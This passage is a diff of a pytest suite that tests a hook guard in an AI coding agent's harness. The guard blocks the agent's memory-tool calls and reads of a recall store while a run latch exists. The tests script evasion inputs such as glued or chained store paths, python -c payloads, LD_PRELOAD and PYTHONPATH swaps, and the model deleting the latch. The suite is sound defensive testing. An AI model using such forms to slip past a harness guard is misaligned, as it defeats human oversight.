@@ -6,13 +6,16 @@
 """Exercise the PreToolUse guard's deny/allow paths via the real stdin/stdout
 hook contract (run the hook as a subprocess, feed JSON on stdin)."""
 
+import ast
 import importlib.util
 import json
 import os
 import re
+import shutil
 import subprocess
 import sys
 from pathlib import Path
+from typing import NamedTuple
 
 import pytest
 
@@ -982,7 +985,10 @@ def test_non_bash_tool_is_allowed(tmp_path: Path) -> None:
 #
 # The gate is armed by a .mem-state.json latch under impl-artifacts; tests point
 # ULTRACODE_IMPL_ARTIFACTS at tmp_path so the latch (and its absence) is fully
-# controlled per-test. "Green" means present + schema_ok True + recall on.
+# controlled per-test. _GREEN_STATE is a v1 latch that was green by the old
+# rules (present + schema_ok True + recall on). Since latch v2 no latch state
+# permits claude-mem: it denies like every other present latch. The v2
+# store-path rule has its own section at the end of this file.
 # ---------------------------------------------------------------------------
 
 _GREEN_STATE = {
@@ -1068,18 +1074,20 @@ def test_risk_no_latch_allows_claude_mem_and_git_guards_intact(tmp_path: Path) -
     assert "Protected-branch" in gout["hookSpecificOutput"]["permissionDecisionReason"]
 
 
-# --- risk: a green latch is the only state that permits claude-mem -----------
+# --- risk: no latch state permits claude-mem any more ------------------------
+# Was test_risk_green_latch_allows_claude_mem_call. latch-and-guard.md, Guard
+# item 1: "There is no green path", and it names this test among those that
+# "Become denies".
 
-def test_risk_green_latch_allows_claude_mem_call(tmp_path: Path) -> None:
+def test_risk_green_latch_denies_claude_mem_call(tmp_path: Path) -> None:
     impl = tmp_path / "impl"
-    _write_state(impl, _GREEN_STATE)
+    _write_state(impl, _GREEN_STATE)  # green by the old v1 rules
     code, out = _run_hook(
         _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
         tmp_path,
         {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
     )
-    assert code == 0
-    assert out is None
+    _assert_mem_denied(code, out)
 
 
 # --- risk: every not-green latch shape must fail closed (deny) ---------------
@@ -1245,17 +1253,18 @@ def test_risk_not_green_denies_grep_under_claude_mem_path(tmp_path: Path) -> Non
     _assert_mem_denied(code, out)
 
 
-def test_risk_green_latch_allows_filesystem_claude_mem_access(tmp_path: Path) -> None:
+# Was test_risk_green_latch_allows_filesystem_claude_mem_access, inverted by the
+# same Guard item 1 line ("Become denies").
+def test_risk_green_latch_denies_filesystem_claude_mem_access(tmp_path: Path) -> None:
     impl = tmp_path / "impl"
-    _write_state(impl, _GREEN_STATE)  # green -> the extension does not fire
+    _write_state(impl, _GREEN_STATE)  # green by the old v1 rules: still denied
     for event in (
         _mem_event("Bash", tmp_path, {"command": "ls ~/.claude-mem"}),
         _mem_event("Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}),
         _mem_event("Grep", tmp_path, {"pattern": "x", "path": "/home/u/.claude-mem"}),
     ):
         code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
-        assert code == 0, event["tool_name"]
-        assert out is None, event["tool_name"]
+        _assert_mem_denied(code, out)
 
 
 def test_risk_no_latch_allows_filesystem_claude_mem_access(tmp_path: Path) -> None:
@@ -2889,3 +2898,2306 @@ def test_mutant_without_the_amp_separator_allows_a_background_write(
 
     assert code == 0
     assert out is None
+
+
+# ---------------------------------------------------------------------------
+# Cross-Session Recall on the local run store (latch v2).
+#
+# latch-and-guard.md, Guard items 1 to 5, through the CSR-UNIT and CSR-INT rows
+# of test-design-epic-cross-session-recall-local-store.md marked PR 2 (each
+# test names its row), and Guard item 7, the latch-path rule of decision 11
+# (AC-29, AC-30, AC-33), in its own section near the end. Every case runs the
+# real hook as a subprocess under a
+# present latch whose `store` sits under tmp_path, with HOME and USERPROFILE
+# pointed at tmp and ULTRACODE_IMPL_ARTIFACTS at the latch's folder; only the
+# parity and separator rows read the hook in-process. On Windows every Bash
+# string is built with as_posix() or quoting: POSIX shlex drops unquoted
+# backslashes.
+#
+# Maintainer defaults pinned here, recorded as such:
+#   - C-2: a latch with no usable store (unset, a v1 latch, an unreadable
+#     latch) still denies every claude-mem call and skips the store-path rule;
+#     the latch-path rule still applies to it.
+#   - Liveness (decisions 2 and 11): a present latch counts as live, and every
+#     deny it causes names the latch path and ends with a note for the person:
+#     delete a left-behind latch by hand, and the model must not remove it.
+# Choices this change makes on the test design's open points, to confirm:
+#   - C-7: `python`, `python3` and `python3.N` may lead an exempt segment, `py`
+#     may not. C-8: the script must follow `uv run` or python directly.
+#   - C-11: the skill root is the guard's own location (scripts/hooks/../..).
+# ---------------------------------------------------------------------------
+
+SCRIPTS = HOOK.parents[1]
+_PINNED_RECALL = SCRIPTS / "mem_recall.py"
+_PINNED_OBSERVATION = SCRIPTS / "mem_observation.py"
+_MEM_COMMON = SCRIPTS / "lib" / "mem_common.py"
+_REPO_ROOT = HOOK.parents[4]
+_RUN = "epic-7-20260604T172512Z"
+_DEAD_RUN = "epic-3-20260101T000000Z"
+_WINDOWS_ONLY = pytest.mark.skipif(sys.platform != "win32", reason="Windows path folding")
+_NEEDS_GIT = pytest.mark.skipif(not shutil.which("git"), reason="git not on PATH")
+
+
+def _v2_latch(store: object, **overrides) -> dict:
+    """A v2 latch as mem_recall.py latch writes it (green unless overridden)."""
+    state = {
+        "latch_version": 2,
+        "run_id": _RUN,
+        "backend": "jsonl",
+        "store_ok": True,
+        "recall": "on",
+        "store": None if store is None else str(store),
+        "fingerprint": "0123456789abcdef",
+        "created_at": "2026-06-04T17:25:12Z",
+    }
+    state.update(overrides)
+    return state
+
+
+class _StoreWorld(NamedTuple):
+    home: Path
+    store: Path
+    cwd: Path
+    impl: Path
+    tmp: Path
+
+    @property
+    def latch(self) -> Path:
+        return self.impl / ".mem-state.json"
+
+    @property
+    def s(self) -> str:
+        """The store as a Bash command spells it."""
+        return self.store.as_posix()
+
+    @property
+    def env(self) -> dict:
+        return {
+            "HOME": str(self.home),
+            "USERPROFILE": str(self.home),
+            "ULTRACODE_IMPL_ARTIFACTS": str(self.impl),
+        }
+
+
+@pytest.fixture
+def store_world(tmp_path: Path) -> _StoreWorld:
+    """A green v2 latch whose store is ~/.ultracode-goal/recall under a tmp home."""
+    home = tmp_path / "home"
+    store = home / ".ultracode-goal" / "recall"
+    cwd = tmp_path / "repo"
+    impl = tmp_path / "impl"
+    store.mkdir(parents=True)
+    cwd.mkdir()
+    _write_state(impl, _v2_latch(store))
+    return _StoreWorld(home, store, cwd, impl, tmp_path)
+
+
+def _run_in(
+    world: _StoreWorld,
+    tool_name: str,
+    tool_input: dict,
+    *,
+    cwd: Path | None = None,
+    hook: Path = HOOK,
+) -> tuple[int, dict | None]:
+    where = cwd or world.cwd
+    return _run_mutant_hook(hook, _mem_event(tool_name, where, tool_input), where, world.env)
+
+
+def _bash(world: _StoreWorld, command: str, **kwargs) -> tuple[int, dict | None]:
+    return _run_in(world, "Bash", {"command": command}, **kwargs)
+
+
+def _person_note(latch: Path) -> str:
+    """The tail every latch deny ends with (AC-13, AC-33): addressed to the
+    person, naming the latch, and telling the model not to remove it."""
+    return (
+        "For the user: if no UltraCode-Goal run is active, a run ended without "
+        f"removing this latch. Delete {latch} by hand. The model must not try "
+        "to remove it itself."
+    )
+
+
+def _assert_latch_denied(code: int, out: dict | None, latch: Path) -> str:
+    """A deny the latch causes: it names the latch and ends with the note for
+    the person (AC-13, AC-33)."""
+    assert code == 2, out
+    assert out is not None
+    decision = out["hookSpecificOutput"]
+    assert decision["permissionDecision"] == "deny"
+    reason = decision["permissionDecisionReason"]
+    assert reason.startswith("Cross-Session Recall guard: ")
+    assert f"The run latch {latch} is present" in reason
+    assert reason.endswith(_person_note(latch))
+    return reason
+
+
+def _assert_allowed(code: int, out: dict | None) -> None:
+    assert code == 0, out
+    assert out is None, out
+
+
+def _filter_args(world: _StoreWorld) -> str:
+    return f"filter --impl-artifacts {world.impl.as_posix()} --store {world.s}"
+
+
+def _write_args(world: _StoreWorld) -> str:
+    return (
+        f"write --impl-artifacts {world.impl.as_posix()} --store {world.s} "
+        f"--epic 7 --run-id {_RUN} --gate-status PASS --verdict advance"
+    )
+
+
+def _exempt_filter(world: _StoreWorld) -> str:
+    return f"uv run {_PINNED_RECALL.as_posix()} {_filter_args(world)}"
+
+
+# --- Guard item 1: claude-mem, denied under every present latch --------------
+
+_PRESENT_LATCHES = {
+    "v1-green-by-old-rules": lambda store: _GREEN_STATE,
+    "v1-red": lambda store: {**_GREEN_STATE, "schema_ok": False},
+    "v2-store-ok": lambda store: _v2_latch(store),
+    "v2-store-not-ok": lambda store: _v2_latch(store, store_ok=False),
+    "v2-recall-off": lambda store: _v2_latch(store, recall="off", store_ok=False),
+    "zero-byte": lambda store: "",
+    "malformed-json": lambda store: "{not: valid json,,,",
+    "non-object": lambda store: [1, 2],
+    "latch-version-3": lambda store: _v2_latch(store, latch_version=3),
+}
+
+
+@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
+@pytest.mark.parametrize("latch", sorted(_PRESENT_LATCHES))
+def test_csr_claude_mem_call_denied_under_every_present_latch(
+    store_world: _StoreWorld, latch: str, tool_name: str
+) -> None:
+    """CSR-UNIT-004 (AC-11, AC-13): every name form, every present latch, no green path."""
+    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
+
+    code, out = _run_in(store_world, tool_name, {"query": "x"})
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert f"refusing the claude-mem MCP call {tool_name}." in reason
+
+
+_INPUT_KEYS = (
+    ("Read", "file_path"),
+    ("Write", "file_path"),
+    ("Edit", "file_path"),
+    ("MultiEdit", "file_path"),
+    ("NotebookEdit", "notebook_path"),
+    ("Glob", "path"),
+    ("Glob", "pattern"),
+    ("Grep", "path"),
+    ("Grep", "glob"),
+)
+_INPUT_KEY_IDS = [f"{tool}-{key}" for tool, key in _INPUT_KEYS]
+
+
+def _file_input(tool: str, key: str, value: str) -> dict:
+    """A realistic input for one file tool, with `value` under `key`."""
+    base = {
+        "Read": {},
+        "Write": {"content": "x"},
+        "Edit": {"old_string": "a", "new_string": "b"},
+        "MultiEdit": {"edits": [{"old_string": "a", "new_string": "b"}]},
+        "NotebookEdit": {"new_source": "x"},
+        "Glob": {"pattern": "*.json"},
+        "Grep": {"pattern": "secret"},
+    }[tool]
+    return {**base, key: value}
+
+
+@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
+def test_csr_claude_mem_reach_denied_through_every_input_key(
+    store_world: _StoreWorld, tool: str, key: str
+) -> None:
+    """CSR-UNIT-005 (AC-11): a reach into .claude-mem under a green v2 latch."""
+    value = (store_world.home / ".claude-mem" / "claude-mem.db").as_posix()
+
+    code, out = _run_in(store_world, tool, _file_input(tool, key, value))
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert f"refusing a {tool} call whose {key} reaches into '.claude-mem'" in reason
+
+
+def test_csr_claude_mem_reach_denied_through_bash(store_world: _StoreWorld) -> None:
+    """CSR-UNIT-005 (AC-11): the Bash half."""
+    code, out = _bash(store_world, "sqlite3 ~/.claude-mem/claude-mem.db .tables")
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
+def test_csr_no_latch_leaves_claude_mem_alone(tmp_path: Path, tool_name: str) -> None:
+    """CSR-UNIT-006 (AC-11): outside a run the user's own claude-mem is untouched.
+
+    The matcher and look-alike rows the spec keeps are unchanged above:
+    test_risk_matcher_hits_live_claude_mem_names and
+    test_risk_matcher_ignores_lookalike_names.
+    """
+    impl = tmp_path / "impl"  # no latch written
+    code, out = _run_hook(
+        _mem_event(tool_name, tmp_path, {"query": "x"}),
+        tmp_path,
+        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
+    )
+    _assert_allowed(code, out)
+
+
+@pytest.mark.parametrize("tool_name", _NON_MEM_TOOLS)
+def test_csr_lookalike_names_pass_a_v2_latch(store_world: _StoreWorld, tool_name: str) -> None:
+    """CSR-UNIT-006: the look-alikes stay allowed under a v2 latch with a store too."""
+    code, out = _run_in(store_world, tool_name, {"query": "x"})
+    _assert_allowed(code, out)
+
+
+def test_csr_deny_reason_names_the_latch_and_the_delete_advice(store_world: _StoreWorld) -> None:
+    """AC-13 and AC-33 wording, pinned whole on one deny (decisions 2 and 11):
+    the stale-latch tail speaks to the person, and tells the model not to try."""
+    code, out = _run_in(store_world, "mcp__claude-mem__search", {})
+
+    assert code == 2
+    latch = store_world.latch
+    assert _reason(out) == (
+        "Cross-Session Recall guard: refusing the claude-mem MCP call "
+        "mcp__claude-mem__search. UltraCode-Goal no longer uses claude-mem, so "
+        "while a run latch is present every claude-mem call is denied. The run "
+        f"latch {latch} is present, and a present latch counts as a live "
+        "UltraCode-Goal run, whatever its version or colour. For the user: if "
+        "no UltraCode-Goal run is active, a run ended without removing this "
+        f"latch. Delete {latch} by hand. The model must not try to remove it "
+        "itself."
+    )
+
+
+def test_csr_left_behind_latch_keeps_denying_until_deleted(store_world: _StoreWorld) -> None:
+    """CSR-UNIT-027 (AC-13): another run's latch, left by a run that died.
+
+    The guard reads no clock and no run id, so the latch denies claude-mem, the
+    store path and the model's own attempt to remove it, each reason naming the
+    latch and the note for the person, until the person deletes the file by
+    hand; then the same calls are allowed (AC-33).
+    """
+    _write_state(
+        store_world.impl,
+        _v2_latch(store_world.store, run_id=_DEAD_RUN, created_at="2026-01-01T00:00:00Z"),
+    )
+    run_file = f"{store_world.s}/local-0123456789abcdef/runs/{_DEAD_RUN}.jsonl"
+    calls = (
+        ("mcp__plugin_claude-mem_mcp-search__search", {"query": "x"}),
+        ("Read", {"file_path": run_file}),
+        ("Bash", {"command": f"cat {run_file}"}),
+        ("Bash", {"command": f"rm -f {store_world.latch.as_posix()}"}),
+    )
+    for tool, tool_input in calls:
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_latch_denied(code, out, store_world.latch)
+
+    store_world.latch.unlink()  # the person, by hand
+
+    for tool, tool_input in calls:
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_allowed(code, out)
+
+
+def test_csr_anything_at_the_latch_path_counts_as_present(store_world: _StoreWorld) -> None:
+    """Fail closed: a latch path that holds a folder is a latch that cannot be
+    read, so claude-mem is denied, and so is removing it (the latch-path rule
+    reads no latch); with no store to read, nothing is denied by store path."""
+    store_world.latch.unlink()
+    store_world.latch.mkdir()
+
+    code, out = _run_in(store_world, "mcp__claude-mem__search", {})
+    _assert_latch_denied(code, out, store_world.latch)
+    code, out = _bash(store_world, f"rm -r {store_world.latch.as_posix()}")
+    _assert_latch_denied(code, out, store_world.latch)
+    _assert_allowed(*_run_in(store_world, "Read", {"file_path": f"{store_world.s}/x"}))
+
+
+# --- Guard item 2: the store-path rule ----------------------------------------
+
+
+def _store_spellings(world: _StoreWorld) -> dict[str, str]:
+    return {
+        "absolute": world.s,
+        "tilde": "~/.ultracode-goal/recall",
+        "dollar-home": "$HOME/.ultracode-goal/recall",
+        "braced-home": "${HOME}/.ultracode-goal/recall",
+        "percent-userprofile": "%USERPROFILE%/.ultracode-goal/recall",
+        "relative-to-cwd": Path(os.path.relpath(world.store, world.cwd)).as_posix(),
+    }
+
+
+_SPELLINGS = (
+    "absolute",
+    "tilde",
+    "dollar-home",
+    "braced-home",
+    "percent-userprofile",
+    "relative-to-cwd",
+)
+
+
+@pytest.mark.parametrize("channel", ["read", "bash-unquoted", "bash-double-quoted"])
+@pytest.mark.parametrize("spelling", _SPELLINGS)
+def test_csr_store_spelling_denied(store_world: _StoreWorld, spelling: str, channel: str) -> None:
+    """CSR-UNIT-007 (AC-12, AC-23): one deny per accepted spelling and channel."""
+    path = f"{_store_spellings(store_world)[spelling]}/runs/x.jsonl"
+    if channel == "read":
+        code, out = _run_in(store_world, "Read", {"file_path": path})
+    elif channel == "bash-unquoted":
+        code, out = _bash(store_world, f"cat {path}")
+    else:
+        code, out = _bash(store_world, f'cat "{path}"')
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert f"names the recall store {store_world.store}." in reason
+    assert str(_PINNED_RECALL) in reason and str(_PINNED_OBSERVATION) in reason
+
+
+@pytest.mark.parametrize(
+    "form",
+    ["tool --opt={s}/runs/x.jsonl", "FOO={s} cmd", "cat <{s}/runs/x.jsonl"],
+    ids=["glued-option", "glued-assignment", "glued-input-redirection"],
+)
+def test_csr_store_glued_into_a_word_denied(store_world: _StoreWorld, form: str) -> None:
+    """CSR-UNIT-007: the glued forms a whole-token comparison would miss."""
+    code, out = _bash(store_world, form.format(s=store_world.s))
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize("suffix", ["", "/", "//", "/."], ids=["bare", "slash", "two-slashes", "slash-dot"])
+def test_csr_store_root_with_trailing_separators_denied(store_world: _StoreWorld, suffix: str) -> None:
+    """CSR-UNIT-007: the store folder itself, with and without trailing separators."""
+    root = store_world.s + suffix
+    for tool, tool_input in (
+        ("Glob", {"pattern": "*", "path": root}),
+        ("Read", {"file_path": root}),
+        ("Bash", {"command": f"ls {root}"}),
+    ):
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_store_siblings_and_ancestors_are_allowed(store_world: _StoreWorld) -> None:
+    """Control: a name that merely starts like the store, or a folder above it
+    (the accepted ancestor-search residual), is not the store."""
+    sibling = f"{store_world.s}2/runs/x.jsonl"
+    parent = store_world.store.parent.as_posix()
+    for tool, tool_input in (
+        ("Read", {"file_path": sibling}),
+        ("Bash", {"command": f"cat {sibling}"}),
+        ("Glob", {"pattern": "**/*.jsonl", "path": parent}),
+        ("Bash", {"command": f"ls {parent}"}),
+        ("Bash", {"command": "echo 'feat(recall): keep the store out'"}),
+    ):
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_allowed(code, out)
+
+
+@_WINDOWS_ONLY
+@pytest.mark.parametrize("quoting", ["unquoted", "double-quoted"])
+def test_csr_userprofile_backslash_spelling_denied_on_windows(
+    store_world: _StoreWorld, quoting: str
+) -> None:
+    """CSR-UNIT-007, Windows only: %USERPROFILE%\\... with backslashes.
+
+    On POSIX `\\` is not a separator, so this spelling names no store there.
+    Unquoted, shlex drops the backslashes and the raw text still reads it.
+    """
+    path = "%USERPROFILE%\\.ultracode-goal\\recall\\runs\\x.jsonl"
+    code, out = _run_in(store_world, "Read", {"file_path": path})
+    _assert_latch_denied(code, out, store_world.latch)
+    command = f"cat {path}" if quoting == "unquoted" else f'cat "{path}"'
+    code, out = _bash(store_world, command)
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@_WINDOWS_ONLY
+@pytest.mark.parametrize(
+    "variant",
+    ["forward-slashes", "upper-case", "upper-case-forward-slashes", "lower-case"],
+)
+def test_csr_windows_separator_and_case_folding(store_world: _StoreWorld, variant: str) -> None:
+    """CSR-UNIT-008 (AC-12, AC-23), Windows only: a path that differs from the
+    store only in separator or letter case is the store."""
+    native = str(store_world.store)
+    spelled = {
+        "forward-slashes": store_world.store.as_posix(),
+        "upper-case": native.upper(),
+        "upper-case-forward-slashes": store_world.store.as_posix().upper(),
+        "lower-case": native.lower(),
+    }[variant]
+    path = spelled + "\\runs\\x.jsonl"
+    code, out = _run_in(store_world, "Read", {"file_path": path})
+    _assert_latch_denied(code, out, store_world.latch)
+    code, out = _bash(store_world, f'cat "{path}"')
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
+def test_csr_store_named_in_each_input_key_denied(
+    store_world: _StoreWorld, tool: str, key: str
+) -> None:
+    """CSR-UNIT-009 (AC-12, AC-23): one deny per inspected input key."""
+    if key in ("pattern", "glob"):
+        value = f"{store_world.s}/**/*.jsonl"
+    else:
+        value = f"{store_world.s}/runs/x.jsonl"
+
+    code, out = _run_in(store_world, tool, _file_input(tool, key, value))
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert f"refusing a {tool} call whose {key} names the recall store" in reason
+
+
+@pytest.mark.parametrize(
+    "tool,key",
+    [("Glob", "pattern"), ("Grep", "glob")],
+    ids=["Glob-pattern", "Grep-glob"],
+)
+def test_csr_relative_pattern_is_taken_from_the_tool_path(
+    store_world: _StoreWorld, tool: str, key: str
+) -> None:
+    """CSR-UNIT-009: a relative pattern under the tool's own `path` reaches the
+    store although `path` (an ancestor) does not."""
+    tool_input = _file_input(tool, key, "recall/**/*.jsonl")
+    tool_input["path"] = store_world.store.parent.as_posix()
+
+    code, out = _run_in(store_world, tool, tool_input)
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert f"whose {key} names the recall store" in reason
+
+
+@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
+def test_csr_unrelated_paths_pass_every_file_tool(
+    store_world: _StoreWorld, tool: str, key: str
+) -> None:
+    """CSR-UNIT-009 control: the same tool and key on a path outside the store."""
+    value = (store_world.cwd / "src" / "x.py").as_posix()
+    code, out = _run_in(store_world, tool, _file_input(tool, key, value))
+    _assert_allowed(code, out)
+
+
+@pytest.mark.parametrize(
+    "joiner",
+    [" ; ", "\n", " & "],
+    ids=["chain", "newline", "background-amp"],
+)
+def test_csr_store_segment_denied_under_each_separator_set(
+    store_world: _StoreWorld, joiner: str
+) -> None:
+    """CSR-UNIT-010 (AC-12, AC-23): an exempt lead never covers a store-touching
+    tail, whichever separator set exposes it."""
+    command = f"{_exempt_filter(store_world)}{joiner}cat {store_world.s}/runs/x.jsonl"
+
+    code, out = _bash(store_world, command)
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert "segment 'cat " in reason
+
+
+def test_csr_each_separator_set_is_load_bearing(guard_module, tmp_path: Path, monkeypatch) -> None:
+    """CSR-UNIT-010 twin: drop the sets that expose a tail and it hides behind
+    the exempt lead, so each set is what denies its own case."""
+    store = tmp_path / "home" / ".ultracode-goal" / "recall"
+    root = (os.path.normcase(os.path.abspath(store)),)
+    cwd = str(tmp_path)
+    homes = [str(tmp_path / "home")]
+    lead = f"uv run {_PINNED_RECALL.as_posix()} filter --store {store.as_posix()}"
+    tail = f"cat {store.as_posix()}/runs/x.jsonl"
+    shipped = guard_module._STORE_SEPARATOR_SETS
+    for command, without_its_sets in (
+        (f"{lead} ; {tail}", (r"(?!)",)),  # no split at all
+        (f"{lead}\n{tail}", shipped[:1]),  # no newline set
+        (f"{lead} & {tail}", shipped[:2]),  # no lone-& set
+    ):
+        assert guard_module._store_segment(command, root, cwd, homes) is not None, command
+        monkeypatch.setattr(guard_module, "_STORE_SEPARATOR_SETS", without_its_sets)
+        assert guard_module._store_segment(command, root, cwd, homes) is None, command
+        monkeypatch.setattr(guard_module, "_STORE_SEPARATOR_SETS", shipped)
+
+
+def _git_classifier_separator_sets() -> tuple[str, ...]:
+    """The tuple of patterns the `for separators in (...)` loop of
+    _command_write_verbs iterates, read from the hook's syntax tree."""
+    tree = ast.parse(_hook_source())
+    func = next(
+        node
+        for node in ast.walk(tree)
+        if isinstance(node, ast.FunctionDef) and node.name == "_command_write_verbs"
+    )
+    loops = [
+        node
+        for node in ast.walk(func)
+        if isinstance(node, ast.For)
+        and isinstance(node.target, ast.Name)
+        and node.target.id == "separators"
+    ]
+    assert len(loops) == 1, "the git classifier's separator loop moved"
+    assert isinstance(loops[0].iter, ast.Tuple)
+    return tuple(ast.literal_eval(element) for element in loops[0].iter.elts)
+
+
+def test_csr_store_separator_sets_mirror_the_git_classifier(guard_module) -> None:
+    """The store rule splits under "each of the guard's three separator sets":
+    exactly the patterns _command_write_verbs splits under, in order, so a set
+    added to or dropped from either side reds here."""
+    assert guard_module._STORE_SEPARATOR_SETS == _git_classifier_separator_sets()
+    assert len(guard_module._STORE_SEPARATOR_SETS) == 3
+
+
+# --- Guard item 3: the pinned script exemption ------------------------------
+
+
+def _allowed_calls(world: _StoreWorld) -> dict[str, str]:
+    recall = _PINNED_RECALL.as_posix()
+    observation = _PINNED_OBSERVATION.as_posix()
+    impl = world.impl.as_posix()
+    filt = _filter_args(world)
+    return {
+        "uv-run-write": f"uv run {observation} {_write_args(world)}",
+        "uv-run-filter": f"uv run {recall} {filt}",
+        "uv-run-latch": (
+            f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} "
+            f"--recall on --store {world.s}"
+        ),
+        "uv-run-drain": f"uv run {observation} drain --impl-artifacts {impl} --store {world.s}",
+        "python-write": f"python {observation} {_write_args(world)}",
+        "python3-filter": f"python3 {recall} {filt}",
+        "python3-minor-filter": f"python3.11 {recall} {filt}",
+        "leading-assignment": f"FOO=1 uv run {recall} {filt}",
+        "keyword": f"if true; then uv run {recall} {filt}; fi",
+        "paren-group": f"( uv run {recall} {filt} )",
+        "glued-paren": f"(uv run {recall} {filt})",
+        "brace-group": f"{{ uv run {recall} {filt}; }}",
+        "dot-step": f"uv run {SCRIPTS.as_posix()}/./mem_recall.py {filt}",
+        "tilde-store": f"uv run {recall} filter --impl-artifacts {impl} --store ~/.ultracode-goal/recall",
+        "quoted": f'uv run "{recall}" filter --impl-artifacts "{impl}" --store "{world.s}"',
+        "then-unrelated": f"uv run {recall} {filt} && echo done",
+    }
+
+
+_ALLOWED_CALLS = (
+    "uv-run-write",
+    "uv-run-filter",
+    "uv-run-latch",
+    "uv-run-drain",
+    "python-write",
+    "python3-filter",
+    "python3-minor-filter",
+    "leading-assignment",
+    "keyword",
+    "paren-group",
+    "glued-paren",
+    "brace-group",
+    "dot-step",
+    "tilde-store",
+    "quoted",
+    "then-unrelated",
+)
+
+
+@pytest.mark.parametrize("name", _ALLOWED_CALLS)
+def test_csr_pinned_recall_scripts_are_exempt(store_world: _StoreWorld, name: str) -> None:
+    """CSR-UNIT-011 (AC-12): the positive controls. An exemption that fails
+    closed turns recall off in every run."""
+    code, out = _bash(store_world, _allowed_calls(store_world)[name])
+    _assert_allowed(code, out)
+
+
+@pytest.mark.parametrize(
+    "cwd_name,operand",
+    [("scripts", "./mem_recall.py"), ("skill-root", "scripts/mem_recall.py")],
+    ids=["dot-slash-from-scripts", "relative-from-skill-root"],
+)
+def test_csr_relative_pinned_path_is_exempt_from_its_own_folder(
+    store_world: _StoreWorld, cwd_name: str, operand: str
+) -> None:
+    """CSR-UNIT-011: a relative path counts when it resolves, from the event's
+    cwd, to the pinned script."""
+    cwd = SCRIPTS if cwd_name == "scripts" else SCRIPTS.parent
+    code, out = _bash(store_world, f"uv run {operand} {_filter_args(store_world)}", cwd=cwd)
+    _assert_allowed(code, out)
+
+
+@pytest.mark.parametrize("joiner", ["&&", "||", ";", "|", "\n", "&"])
+def test_csr_compound_with_a_store_segment_denied(store_world: _StoreWorld, joiner: str) -> None:
+    """CSR-UNIT-012 (AC-12, AC-23): checked per segment, not on the whole command."""
+    command = f"{_exempt_filter(store_world)} {joiner} cat {store_world.s}/runs/x.jsonl"
+    code, out = _bash(store_world, command)
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def _not_exempt_calls(world: _StoreWorld) -> dict[str, str]:
+    recall = _PINNED_RECALL.as_posix()
+    elsewhere = world.tmp / "x" / "scripts" / "mem_observation.py"
+    elsewhere.parent.mkdir(parents=True, exist_ok=True)
+    shutil.copyfile(_PINNED_OBSERVATION, elsewhere)
+    (world.cwd / "mem_recall.py").write_text("print('not the pinned script')\n", encoding="utf-8")
+    payload = f"open('{world.s}/runs/x.jsonl').read()"
+    evil = (world.tmp / "evil").as_posix()
+    return {
+        # CSR-UNIT-013: the path is pinned, not the basename.
+        "same-name-elsewhere": f"uv run {elsewhere.as_posix()} write --store {world.s}",
+        "dot-slash-from-another-cwd": f"uv run ./mem_recall.py filter --store {world.s}",
+        "dotdot-escape": (
+            f"uv run {SCRIPTS.as_posix()}/../../evil/scripts/mem_observation.py "
+            f"write --store {world.s}"
+        ),
+        "python-dash-c": f'python -c "{payload}" {recall} filter',
+        "uv-run-python-dash-c": f'uv run python -c "{payload}" {recall} filter',
+        # C-7 and C-8 as chosen here: the script right after `uv run` or a bare python.
+        "option-before-script": f"uv run --with x {recall} filter --store {world.s}",
+        "uv-run-python": f"uv run python {recall} filter --store {world.s}",
+        "interpreter-by-path": f"/usr/bin/python3 {recall} filter --store {world.s}",
+        "py-launcher": f"py {recall} filter --store {world.s}",
+        # An assignment that swaps the interpreter or its modules.
+        "pythonpath-assignment": f"PYTHONPATH={evil} uv run {recall} filter --store {world.s}",
+        "path-assignment": f"PATH={evil}:$PATH python {recall} filter --store {world.s}",
+        "uv-assignment": f"UV_PYTHON={evil}/python uv run {recall} filter --store {world.s}",
+        # The same, glued to a group opener (bmad review 6).
+        "glued-paren-assignment": f"(PYTHONPATH={evil} uv run {recall} filter --store {world.s})",
+        # An assignment that moves the home folder, the configuration uv, git
+        # or Python read, or the environment the call runs in (bypass review 1).
+        "home-assignment": f"HOME={evil} python3 {recall} filter --store {world.s}",
+        "userprofile-assignment": f"USERPROFILE={evil} uv run {recall} filter --store {world.s}",
+        "appdata-assignment": f"APPDATA={evil} uv run {recall} filter --store {world.s}",
+        "xdg-assignment": f"XDG_CONFIG_HOME={evil} uv run {recall} filter --store {world.s}",
+        "git-config-assignment": f"GIT_CONFIG_COUNT=1 uv run {recall} filter --store {world.s}",
+        "conda-assignment": f"CONDA_PREFIX={evil} uv run {recall} filter --store {world.s}",
+        "virtual-env-assignment": f"VIRTUAL_ENV={evil} uv run {recall} filter --store {world.s}",
+        "ld-preload-assignment": f"LD_PRELOAD={evil}/x.so uv run {recall} filter --store {world.s}",
+    }
+
+
+_NOT_EXEMPT_CALLS = (
+    "same-name-elsewhere",
+    "dot-slash-from-another-cwd",
+    "dotdot-escape",
+    "python-dash-c",
+    "uv-run-python-dash-c",
+    "option-before-script",
